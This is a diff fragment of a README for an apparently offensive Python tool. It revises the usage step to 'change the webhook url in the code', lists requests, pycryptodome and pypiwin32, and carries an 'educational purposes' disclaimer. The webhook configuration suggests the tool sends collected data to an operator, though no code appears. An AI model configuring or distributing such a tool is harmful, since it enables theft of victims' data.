@@ -7,7 +7,7 @@ This is strictly for educational purposes. By using it you agree that you will N
 
 ## How to use it?
 
-|In order to use it, download the following libraries and run the python script.|
+|In order to use it, download the following libraries and change the webhook url in the code.|
 |-------------------------------------------------|
 requests, pycryptodome, pypiwin32,
 
